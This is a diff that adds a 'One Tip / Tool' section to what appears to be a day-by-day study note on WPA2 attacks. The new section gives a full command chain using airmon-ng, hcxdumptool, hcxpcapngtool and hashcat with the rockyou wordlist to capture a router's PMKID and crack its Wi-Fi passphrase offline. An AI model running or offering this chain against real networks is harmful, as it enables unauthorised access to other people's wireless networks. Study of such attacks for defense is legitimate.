@@ -47,3 +47,22 @@ From a defender's side, the defense is the same as WPA2 cracking in general — 
 - EAPOL (Extensible Authentication Protocol over LAN): the protocol used for WPA2 authentication exchanges including the 4-way handshake
 - RSN IE (Robust Security Network Information Element): information included in router beacon frames that enables the PMKID attack
 - SAE (Simultaneous Authentication of Equals): WPA3's authentication method that replaces PSK and is immune to offline dictionary attacks
+
+## One Tip / Tool
+
+Tool: `hcxdumptool` + `hashcat` — the standard combo for PMKID attacks
+
+```bash
+# full attack chain
+airmon-ng start wlan0
+hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
+# wait 30-60 seconds then Ctrl+C
+
+hcxpcapngtool -o hash.hc22000 pmkid.pcapng
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt --force
+
+# if password found hashcat shows
+# [password] -> WifiPassword123
+```
+
+The key difference from WPA2 handshake cracking (day 11) — with PMKID you don't need `airodump-ng`, `aireplay-ng`, or any client devices. Just `hcxdumptool` talking directly to the router. Much cleaner and faster.
